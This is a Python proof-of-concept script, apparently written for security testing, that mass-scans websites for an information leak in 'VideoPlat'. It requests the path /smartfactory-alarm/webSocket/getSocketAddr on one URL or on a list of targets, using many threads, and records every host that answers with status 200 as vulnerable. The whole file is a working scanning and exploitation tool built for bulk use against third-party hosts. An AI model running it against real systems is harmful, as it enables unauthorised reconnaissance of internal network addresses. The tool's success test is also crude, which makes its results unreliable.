# -*- coding: utf-8 -*
# *python3*

import requests
import getopt
import datetime
import sys
import threading
import urllib3
import time
from colorama import init, Fore
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 

lock = threading.Lock()
global result_file_path
global proxies_judge
loop_name = ''

def exploit(url):

    global proxies_judge
    proxies = {
    "http": 'http://127.0.0.1:8080',
    "https": 'http://127.0.0.1:8080'
    }
    head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'}
    payload = "/smartfactory-alarm/webSocket/getSocketAddr"
    exp = url + payload
    try:
        if proxies_judge:
            re = requests.get(exp,verify=False,timeout=5,proxies=proxies)
        else:
            re = requests.get(exp,verify=False,timeout=5)
        if re.status_code == 200:
            msg = "Vulnerability success "+exp
            judge = 1
            output_to_file(msg)
        else:
            msg = 'Vulnerability failure'+url
            judge = 2
    except:
        msg = 'error! The destination path is inaccessible'
        judge = 3
    output(msg,judge)

def output_to_file(msg):

    global result_file_path
    f = open(result_file_path,'a')
    f.write(msg+'\n')
    f.close()

def output(msg,judge=0):

    lock.acquire()
    try:
        now_time = datetime.datetime.now().strftime('%H:%M:%S')
        now_time = Fore.LIGHTBLUE_EX + '['+now_time+'] ' + Fore.RESET 
        if judge == 0:
            print(now_time + msg )
        elif judge == 1: # Output success information
            print(now_time + Fore.LIGHTGREEN_EX + '[+] ' + msg + Fore.RESET)
        elif judge == 2: # Output failure information
            print(now_time + Fore.LIGHTYELLOW_EX + '[-] ' + msg + Fore.RESET)
        elif judge == 3: # Output error message
            print(now_time + Fore.LIGHTRED_EX +'[-] ' + msg + Fore.RESET)
    finally:
        lock.release()

def help():

    print("""
    -h --help                   Help document
    -u --url                    The target url
    -f --target_file            File at the destination address
    -r --resutl_file            The output information file address (default: resutl.txt)
    -t --thread_num             Number of threads (default 50)
    -p --proxies                Whether to enable the proxy. The proxy is disabled by default. If you enter the proxy, the proxy is enabled
eg：
    python3 poc.py -u http://www.xxx.com
    python3 poc.py -f target.txt
    python3 poc.py -f target.txt -r result.txt
    python3 poc.py -f target.txt -r result.txt -t 100
    """)

def poc_head():
    print("""
        ________________________
          / __  // __ \ / __ \
          / /_/ // / / // /     
         / ____// /_/ // /___   
        /_/     \____/ \____/                                   
                            
        author         weifn
        vulnerability  VideoPlat Leaking Intranet Information
    """.format(loop_name))

def main():
    global proxies_judge
    global result_file_path
    result_file_path = 'result.txt'
    target_num = 50
    target_file_path = ''
    url = ''
    msg = []
    proxies_judge = False

    poc_head()

    try:
        opts, args = getopt.getopt(sys.argv[1:], 
        "hf:r:t:u:p",
        ["help","target_file=","result_file=","thread_num=","url=","--proxies"])
    except getopt.GetoptError as err:
        print(str(err))
        help()

    # Read data from the OPTS. O is the parameter and a is the value followed by the parameter
    for o,a in opts:
        if o in ['-h','--help']:            
            help()
        elif o in ['-u','--url']:
            url = a
        elif o in ['-f','--target_file']:            
            target_file_path = a  
            try:
                f = open(target_file_path,'r')
                msg = f.read().split('\n')
            except:
                output('The destination file path is incorrect！' , 3)
        elif o in ['-r','--result']:
            result_file_path = a
        elif o in ['-t',"--thread_num"]:
            target_num = int(a)
        elif o in ['-p',"--proxies"]:
            proxies_judge = True

    i = 0
    if url == '' and len(msg) != 0:
        while True:
            if threading.active_count()-1 < target_num and i < len(msg):
                t = threading.Thread(target=exploit,args=(msg[i],))
                t.start()
                i+=1
                output_msg = ''+str(i)+'Target start check，and'+str(len(msg)-i)+'Target to be checked！'
                output(output_msg)
            if i >= len(msg) and threading.active_count() == 1:
                f = open(result_file_path,'r')
                num = len(f.readlines())
                output('finish! A total of scanning'+str(len(msg))+'web site，Find loopholes'+str(num)+'！')
                break
            elif i>= len(msg) and threading.active_count() > 1:
                output('Checking the last few targets. Please hold...')
                time.sleep(5)
    elif url != '' and len(msg) == 0:
        exploit(url)

if __name__ == '__main__':
    main()